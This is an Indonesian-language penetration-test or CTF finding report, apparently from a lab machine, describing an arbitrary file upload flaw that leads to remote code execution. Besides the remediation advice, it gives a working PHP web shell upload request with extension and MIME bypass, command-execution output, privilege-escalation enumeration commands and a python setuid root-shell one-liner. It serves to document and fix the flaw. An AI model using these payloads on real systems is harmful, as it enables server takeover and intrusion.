# Finding 01: Arbitrary File Upload to Remote Code Execution (RCE)

| Item | Detail |
|------|--------|
| **Kerentanan** | Arbitrary File Upload to Remote Code Execution (RCE) |
| **Severity** | Critical |
| **Skor CVSS** | 9.3 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`) |
| **URL PoC** | `http://192.168.56.105:8083/uploads/tickets/4243_php-reverse-shell.phtml` |
| **Endpoint** | `POST /submit.php` |

---

## Deskripsi

Kerentanan ini terjadi akibat kurangnya validasi ketat terhadap jenis, ekstensi, maupun konten file yang diunggah pengguna. Celah ini memungkinkan penyerang mengunggah file skrip berbahaya (*web shell*) ke direktori web server yang dapat diakses secara publik.

---

## Dampak

- **Remote Code Execution (RCE):** Penyerang dapat mengeksekusi perintah sistem operasi pada server secara jarak jauh (Remote Code Execution / RCE).
- **Pengambilalihan Server:** Penyerang berpotensi mengambil alih kontrol penuh atas server aplikasi, mengakses file internal sensitif, atau memanfaatkan server sebagai pijakan untuk menyerang jaringan internal (*pivoting*).

---

## Rekomendasi Perbaikan

- Terapkan validasi *server-side* berbasis daftar putih (*allowlist*) untuk mengecek ekstensi dan MIME-type file yang diizinkan.
- Simpan file hasil unggahan di luar *web root* atau gunakan layanan *Cloud Object Storage*.
- Ubah nama file yang diunggah secara acak (*randomize*) dan nonaktifkan izin eksekusi skrip (*disable execution permission*) pada direktori penyimpanan.

---

## Langkah Proof of Concept (PoC)

### Langkah 1 — Pengunggahan Web Shell (Bypass Validation)

Modifikasi request pengunggahan file menggunakan Burp Suite, lalu sesuaikan header `Content-Type` menjadi MIME-type yang diizinkan (seperti `image/jpeg` atau `application/pdf`) dan ubah nama file menggunakan ekstensi eksekutabel alternatif (`.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, atau `.phar`).

```http
POST /submit.php HTTP/1.1
Host: 192.168.56.105:8083
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="attachment"; filename="4243_php-reverse-shell.phtml"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

> **[Capture Intercept Request Burp Suite Upload .phtml]**

---

### Langkah 2 — Verifikasi Eksekusi Web Shell (RCE)

Mengakses URL hasil unggahan file `http://192.168.56.105:8083/uploads/tickets/4243_php-reverse-shell.phtml` di web server untuk memastikan bahwa skrip PHP dieksekusi oleh server web.

```http
GET /uploads/tickets/4243_php-reverse-shell.phtml?cmd=id HTTP/1.1
Host: 192.168.56.105:8083
```

**Response:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **[Capture Akses URL PoC & Output Command Execution]**

---

### Langkah 3 — Eskalasi untuk mendapatkan akses root

Mengecek kerentanan sistem dengan perintah:

```bash
find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r /
```

Ditemukan bahwa penyerang dapat memperoleh akses root menggunakan payload:

```bash
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Kemudian mencari flag menggunakan:

```bash
find . -iname "flag.txt"
```

Dan didapatkan flag berada di direktori `./root/flag.txt`.
